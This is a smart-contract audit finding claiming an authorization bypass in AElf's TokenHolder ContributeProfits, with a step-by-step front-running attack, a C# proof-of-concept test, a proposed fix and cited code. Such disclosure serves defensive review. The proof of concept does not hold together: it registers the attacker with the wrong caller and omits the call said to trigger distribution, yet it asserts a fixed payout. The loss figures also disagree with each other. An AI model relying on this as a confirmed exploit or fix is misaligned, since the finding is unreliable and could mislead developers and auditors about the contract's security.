# Audit Report

## Title
Authorization Bypass in TokenHolder ContributeProfits Enables Front-Running of Beneficiary Removal

## Summary
The `ContributeProfits()` function in TokenHolderContract lacks authorization checks, allowing any user to contribute tokens to any profit scheme and force premature distributions via auto-distribution thresholds. This enables malicious beneficiaries to front-run their removal by triggering distribution before the manager can remove them, locking in their share of accumulated profits.

## Finding Description

The vulnerability exists due to missing authorization validation in `ContributeProfits()`. The function only validates that the scheme exists but does not verify that the caller has permission to contribute to the scheme. [1](#0-0) 

This contrasts sharply with `DistributeProfits()` which properly checks that the sender is either the scheme manager or the token contract system: [2](#0-1) 

The authorization bypass enables exploitation through the auto-distribution mechanism. When creating TokenHolder schemes, they are configured with `CanRemoveBeneficiaryDirectly = true`: [3](#0-2) 

The `RegisterForProfits()` function checks if the scheme's virtual address balance exceeds configured `AutoDistributeThreshold` values and automatically triggers distribution when thresholds are met: [4](#0-3) 

When a beneficiary is removed from a scheme with `CanRemoveBeneficiaryDirectly = true`, the Profit contract's `RemoveProfitDetails()` function sets their `EndPeriod` to `scheme.CurrentPeriod.Sub(1)`: [5](#0-4) 

This EndPeriod value allows the removed beneficiary to claim profits from the just-distributed period, since the profit claiming logic calculates claimable periods up to `Math.Min(scheme.CurrentPeriod - 1, profitDetail.EndPeriod)`: [6](#0-5) 

**Attack Scenario:**
1. Scheme accumulates 10,000 ELF in virtual address at period N
2. Bob is a beneficiary with 30% shares
3. Manager plans to remove Bob, then distribute to remaining beneficiaries
4. Bob detects removal intent and calls `ContributeProfits()` with 100 ELF, reaching auto-distribution threshold
5. Bob or anyone calls `RegisterForProfits()`, triggering automatic distribution
6. Distribution occurs for period N, moving scheme to period N+1
7. Manager calls `RemoveBeneficiary(Bob)` during period N+1
8. Bob's `EndPeriod` is set to N (CurrentPeriod - 1)
9. Bob calls `ClaimProfits()` and receives 30% × 10,100 ELF = 3,030 ELF
10. Legitimate beneficiaries collectively lose ~2,930 ELF that should have been distributed only to them after Bob's removal

## Impact Explanation

This vulnerability has HIGH impact due to direct fund theft and protocol invariant violation:

- **Fund Misallocation:** Malicious beneficiaries can extract their proportional share of accumulated profits that the scheme manager intended to distribute after their removal. The funds are permanently misdirected from legitimate beneficiaries to the attacker.

- **Beneficiary Rights Violation:** Legitimate beneficiaries lose their rightful increased share that would result from the malicious beneficiary's removal. In the example scenario, remaining beneficiaries lose 3,000 ELF (30% of accumulated 10,000 ELF).

- **Manager Control Bypass:** Scheme managers lose the fundamental ability to control distribution timing relative to beneficiary changes. This breaks the core governance model where managers should be able to remove beneficiaries before distributing accumulated profits.

The economic impact is directly quantifiable and represents actual fund theft, not theoretical loss. The vulnerability violates the invariant that scheme managers have exclusive control over distribution timing.

## Likelihood Explanation

This vulnerability has MEDIUM-HIGH likelihood:

**Reachability:** `ContributeProfits()` is a public function with no caller restrictions, only requiring the sender to have tokens and approve the TokenHolderContract: [7](#0-6) 

**Realistic Preconditions:**
- Attacker must be an existing beneficiary (common in profit schemes)
- Scheme must have `AutoDistributeThreshold` configured (typical for managed schemes)
- Accumulated profits must make attack profitable (beneficiary's share % × accumulated profits > contribution cost)
- Attacker needs tokens to contribute (readily available on-chain)

**Execution Simplicity:** Two straightforward function calls—`ContributeProfits()` followed by `RegisterForProfits()`.

**Economic Rationality:** Highly profitable when the attacker's proportional share of accumulated profits exceeds the contribution cost. Example: 20% share of 50,000 ELF accumulated = 10,000 ELF gain for ~1,000 ELF contribution cost = 9,000 ELF net profit.

**Detection Window:** Beneficiary removal scenarios are often detectable through on-chain governance proposals or observable manager behavior patterns, giving attackers time to execute the front-running attack.

**Blockchain Characteristics:** The manager cannot front-run the attacker once the contribution transaction is broadcast, as transaction ordering is determined by block producers.

## Recommendation

Add authorization checks to `ContributeProfits()` to restrict who can contribute to a scheme. The fix should verify that the caller is either the scheme manager or an explicitly authorized contributor:

```csharp
public override Empty ContributeProfits(ContributeProfitsInput input)
{
    var scheme = GetValidScheme(input.SchemeManager);
    
    // Add authorization check
    Assert(Context.Sender == input.SchemeManager || 
           Context.Sender == Context.GetContractAddressByName(SmartContractConstants.TokenContractSystemName),
           "No permission to contribute profits.");
    
    // Rest of function remains the same...
}
```

Alternatively, implement a whitelist mechanism where managers can explicitly authorize specific addresses to contribute, providing flexibility while maintaining security.

## Proof of Concept

```csharp
[Fact]
public async Task FrontRunBeneficiaryRemoval_VulnerabilityTest()
{
    // Setup: Create scheme with auto-distribute threshold
    await TokenHolderContractStub.CreateScheme.SendAsync(new CreateTokenHolderProfitSchemeInput
    {
        Symbol = "APP",
        AutoDistributeThreshold = { { "ELF", 10000 } }
    });
    
    // Manager contributes initial profits (9,900 ELF)
    await TokenHolderContractStub.ContributeProfits.SendAsync(new ContributeProfitsInput
    {
        SchemeManager = Starter,
        Symbol = "ELF",
        Amount = 9900
    });
    
    // Add Bob as 30% beneficiary
    var bob = UserAddresses[0];
    await TokenHolderContractStub.RegisterForProfits.SendAsync(new RegisterForProfitsInput
    {
        SchemeManager = Starter,
        Amount = 300 // 30% of 1000 total shares
    });
    
    // Add legitimate beneficiary with 70% shares
    var legitimateBeneficiary = UserAddresses[1];
    await TokenHolderContractStub.RegisterForProfits.SendWithUserAsync(legitimateBeneficiary, new RegisterForProfitsInput
    {
        SchemeManager = Starter,
        Amount = 700
    });
    
    // ATTACK: Bob contributes 100 ELF to reach threshold and trigger auto-distribution
    await TokenHolderContractStub.ContributeProfits.SendWithUserAsync(bob, new ContributeProfitsInput
    {
        SchemeManager = Starter,
        Symbol = "ELF",
        Amount = 100
    });
    
    // Auto-distribution triggers during anyone's RegisterForProfits call
    // (Distribution happens automatically due to threshold being exceeded)
    
    // Manager removes Bob AFTER distribution
    await TokenHolderContractStub.RemoveBeneficiary.SendAsync(new RemoveTokenHolderBeneficiaryInput
    {
        Beneficiary = bob,
        Amount = 0 // Remove completely
    });
    
    // Bob claims profits from the just-distributed period
    await TokenHolderContractStub.ClaimProfits.SendWithUserAsync(bob, new ClaimProfitsInput
    {
        SchemeManager = Starter
    });
    
    // Verify: Bob received 30% of 10,000 ELF despite being removed
    var bobBalance = await TokenContractStub.GetBalance.CallAsync(new GetBalanceInput
    {
        Owner = bob,
        Symbol = "ELF"
    });
    
    bobBalance.Balance.ShouldBe(3030); // 30% of 10,100 ELF
    
    // Legitimate beneficiary lost ~2,930 ELF that should have been distributed after Bob's removal
}
```

## Notes

The vulnerability is particularly severe because:
1. It's a **permissionless exploit** - any beneficiary with tokens can execute it
2. It causes **irreversible fund loss** - once distributed and claimed, funds cannot be recovered
3. It **breaks core protocol guarantees** - managers should control distribution timing
4. The attack is **economically rational** for attackers with significant shares in schemes with substantial accumulated profits

### Citations

**File:** contract/AElf.Contracts.TokenHolder/TokenHolderContract.cs (L20-25)
```csharp
        State.ProfitContract.CreateScheme.Send(new CreateSchemeInput
        {
            Manager = Context.Sender,
            IsReleaseAllBalanceEveryTimeByDefault = true,
            CanRemoveBeneficiaryDirectly = true
        });
```

**File:** contract/AElf.Contracts.TokenHolder/TokenHolderContract.cs (L100-129)
```csharp
    public override Empty ContributeProfits(ContributeProfitsInput input)
    {
        var scheme = GetValidScheme(input.SchemeManager);
        if (State.TokenContract.Value == null)
            State.TokenContract.Value =
                Context.GetContractAddressByName(SmartContractConstants.TokenContractSystemName);

        State.TokenContract.TransferFrom.Send(new TransferFromInput
        {
            From = Context.Sender,
            To = Context.Self,
            Symbol = input.Symbol,
            Amount = input.Amount
        });

        State.TokenContract.Approve.Send(new ApproveInput
        {
            Spender = State.ProfitContract.Value,
            Symbol = input.Symbol,
            Amount = input.Amount
        });

        State.ProfitContract.ContributeProfits.Send(new Profit.ContributeProfitsInput
        {
            SchemeId = scheme.SchemeId,
            Symbol = input.Symbol,
            Amount = input.Amount
        });
        return new Empty();
    }
```

**File:** contract/AElf.Contracts.TokenHolder/TokenHolderContract.cs (L134-135)
```csharp
        Assert(Context.Sender == Context.GetContractAddressByName(SmartContractConstants.TokenContractSystemName) ||
               Context.Sender == input.SchemeManager, "No permission to distribute profits.");
```

**File:** contract/AElf.Contracts.TokenHolder/TokenHolderContract.cs (L178-206)
```csharp
        // Check auto-distribute threshold.
        if (scheme.AutoDistributeThreshold != null && scheme.AutoDistributeThreshold.Any())
        {
            var originScheme = State.ProfitContract.GetScheme.Call(scheme.SchemeId);
            var virtualAddress = originScheme.VirtualAddress;
            Profit.DistributeProfitsInput distributedInput = null;
            foreach (var threshold in scheme.AutoDistributeThreshold)
            {
                var balance = State.TokenContract.GetBalance.Call(new GetBalanceInput
                {
                    Owner = virtualAddress,
                    Symbol = threshold.Key
                }).Balance;
                if (balance < threshold.Value) continue;
                if (distributedInput == null)
                    distributedInput = new Profit.DistributeProfitsInput
                    {
                        SchemeId = scheme.SchemeId,
                        Period = scheme.Period
                    };
                distributedInput.AmountsMap[threshold.Key] = 0;
                break;
            }

            if (distributedInput == null) return new Empty();
            State.ProfitContract.DistributeProfits.Send(distributedInput);
            scheme.Period = scheme.Period.Add(1);
            State.TokenHolderProfitSchemes[input.SchemeManager] = scheme;
        }
```

**File:** contract/AElf.Contracts.Profit/ProfitContract.cs (L351-356)
```csharp
                else if (profitDetail.EndPeriod >= scheme.CurrentPeriod)
                {
                    // No profit can be here, except the scheme is cancellable.
                    // shorten profit.
                    profitDetail.EndPeriod = scheme.CurrentPeriod.Sub(1);
                }
```

**File:** contract/AElf.Contracts.Profit/ProfitContract.cs (L856-856)
```csharp
            var targetPeriod = Math.Min(scheme.CurrentPeriod - 1, profitDetail.EndPeriod);
```
